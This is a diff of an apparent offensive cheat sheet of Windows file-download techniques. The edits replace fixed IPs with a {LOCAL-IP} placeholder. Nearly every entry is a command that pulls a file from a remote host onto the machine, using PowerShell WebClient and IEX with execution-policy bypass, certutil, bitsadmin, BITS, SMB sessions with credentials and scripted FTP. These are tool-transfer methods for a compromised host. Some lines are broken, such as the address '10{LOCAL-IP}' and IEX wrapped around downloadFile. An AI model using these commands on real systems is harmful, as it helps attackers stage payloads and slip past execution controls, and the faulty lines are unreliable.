@@ -3,53 +3,53 @@ USING POWERSHELL -
 
 **Web Content Download**
     
-    $webClient.DownloadFile('http://10.10.10.10:80/demo.txt','c:\temp\demo.txt')
+    $webClient.DownloadFile('http://{LOCAL-IP}:80/demo.txt','c:\temp\demo.txt')
 
 **Web Content Download**
     
-    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\temp\demo.txt')
+    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://{LOCAL-IP}/demo.txt','c:\temp\demo.txt')
 
 **Web Content Download**
     
-    powershell.exe IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10:80/demo.txt','C:\temp\demo.txt')
+    powershell.exe IEX(New-Object System.Net.WebClient).downloadFile('http://{LOCAL-IP}:80/demo.txt','C:\temp\demo.txt')
 
 **Web Content Download**
     
-    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10/demo.txt','C:\temp\demo.txt')"
+    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://{LOCAL-IP}/demo.txt','C:\temp\demo.txt')"
 
 **Web Content Download**
     
-    powershell.exe Invoke-RestMethod -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"
+    powershell.exe Invoke-RestMethod -Uri "http://{LOCAL-IP}/demo.txt" -OutFile "c:\temp\demo.txt"
 
 **Web Content Download**
     
-    powershell.exe Invoke-webRequest -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"
+    powershell.exe Invoke-webRequest -Uri "http://{LOCAL-IP}/demo.txt" -OutFile "c:\temp\demo.txt"
 
 **Powershell Wget**
     
-    powershell.exe -c wget "http://10.10.14.17/demo.txt" -outfile "c:\temp\demo.txt"
+    powershell.exe -c wget "http://{LOCAL-IP}/demo.txt" -outfile "c:\temp\demo.txt"
 
 **Powershell Curl**
     
-    powershell.exe -c "curl.exe http://10.10.10.10:80/demo.txt c:\temp\demo.txt"
+    powershell.exe -c "curl.exe http://{LOCAL-IP}:80/demo.txt c:\temp\demo.txt"
 
 **Powershell IEX**
 
-    echo IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10:80/demo.txt','C:\temp\demo.txt') | powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
+    echo IEX(New-Object System.Net.WebClient).downloadFile('http://{LOCAL-IP}:80/demo.txt','C:\temp\demo.txt') | powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
    
 **Powershell Direct URI**
     
-    iwr -uri http://192.168.45.240/demo.txt -Outfile demo.txt
+    iwr -uri http://{LOCAL-IP}/demo.txt -Outfile demo.txt
 
 **Powershell BitsTransfer**
 
-    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'c:\temp\demo.txt'"
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LOCAL-IP}/demo.txt' -Destination 'c:\temp\demo.txt'"
 
 **Using file**
     
     echo '$storageDir = $pwd' > wget.ps1
     echo '$webclient = New-Object System.Net.WebClient' >> wget.ps1
-    echo '$url = "http://10.10.10.10/demo.txt"' >> wget.ps1
+    echo '$url = "http://{LOCAL-IP}/demo.txt"' >> wget.ps1
     echo '$file = "c:\temp\demo.txt"' >> wget.ps1
     echo '$webclient.DownloadFile($url, $file)' >> wget.ps1
 
@@ -63,19 +63,19 @@ USING CMD -
 
 **Web Content Download**
     
-    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\temp\demo.txt')
+    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10{LOCAL-IP}/demo.txt','c:\temp\demo.txt')
 
 **Web Content Download**
 
-    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'C:\temp\demo.txt'"
-
-**Web Content Download**
-    
-    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('http://10.10.10.10:80/demo.txt','c:\temp\demo.txt')"
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LOCAL-IP}/demo.txt' -Destination 'C:\temp\demo.txt'"
 
 **Web Content Download**
     
-    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10/demo.txt','C:\temp\demo.txt')"
+    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('http://{LOCAL-IP}:80/demo.txt','c:\temp\demo.txt')"
+
+**Web Content Download**
+    
+    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://{LOCAL-IP}/demo.txt','C:\temp\demo.txt')"
 
 ------------------------------------------------------------------------------------------------------------------
 
@@ -86,7 +86,7 @@ USING CERTUTIL -
 
 **Web Content Download**
     
-    certutil.exe -urlcache -split -f "http://10.10.10.10/demo.txt" demo.txt
+    certutil.exe -urlcache -split -f "http://{LOCAL-IP}/demo.txt" demo.txt
 
 **encode content to base64**
 
@@ -122,11 +122,11 @@ USING SMB -
 
 **To create authenticated session**
     
-    net use \\10.10.10.10 /u:"user" "123"
+    net use \\{LOCAL-IP} /u:"user" "123"
 
 **Web Content Download**
     
-    copy \\10.10.10.10\share\demo.txt c:\temp\demo.txt  
+    copy \\{LOCAL-IP}\share\demo.txt c:\temp\demo.txt  
 ------------------------------------------------------------------------------------------------------------------
 
 </br>
@@ -180,15 +180,15 @@ USING BITSADMIN -
 
 **Web Content Download**
     
-    bitsadmin /transfer n http://10.10.10.10/demo.txt C:\temp\demo.txt
+    bitsadmin /transfer n http://{LOCAL-IP}/demo.txt C:\temp\demo.txt
 
 **Web Content Download**
     
-    bitsadmin /transfer evil /download /priority high http://10.10.10.10:80/demo.txt c:\temp\demo.txt
+    bitsadmin /transfer evil /download /priority high http://{LOCAL-IP}:80/demo.txt c:\temp\demo.txt
 
 **Web Content Download**
     
-    powershell.exe -c Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.10/demo.txt" -Destination "C:\temp\demo.txt"
+    powershell.exe -c Import-Module bitstransfer;Start-BitsTransfer -Source "http://{LOCAL-IP}/demo.txt" -Destination "C:\temp\demo.txt"
 ------------------------------------------------------------------------------------------------------------------
 
 </br>
@@ -216,7 +216,7 @@ USING FTP -
 
 Replace "demo.txt" with desired file name
     
-    echo open 10.10.10.10 21 > file.txt
+    echo open {LOCAL-IP} 21 > file.txt
     echo bin>> file.txt
     echo get demo.txt>> file.txt
     echo bye>> file.txt
@@ -225,19 +225,19 @@ Replace "demo.txt" with desired file name
 
 **One Liner**
 
-    echo open 10.10.10.10 21 > file.txt && echo bin>> file.txt && echo get demo.txt>> file.txt && echo bye>> file.txt && ftp -A -v -n -s:file.txt
+    echo open {LOCAL-IP} 21 > file.txt && echo bin>> file.txt && echo get demo.txt>> file.txt && echo bye>> file.txt && ftp -A -v -n -s:file.txt
 
 **Mannualy**
 
     ftp
-    open 10.10.10.10 2121
+    open {LOCAL-IP} 2121
     get demo.txt
 
 **FTP Authenticated**
 
 Replace "demo.txt" with desired file name
     
-    echo open 10.10.10.10 21 > file.txt
+    echo open {LOCAL-IP} 21 > file.txt
     echo user test>> file.txt
     echo test>> file.txt
     echo bin>> file.txt
@@ -249,6 +249,6 @@ Replace "demo.txt" with desired file name
 **Mannualy**
 
     ftp
-    open 10.10.10.10 2121
+    open {LOCAL-IP} 2121
     get demo.txt
 ------------------------------------------------------------------------------------------------------------------
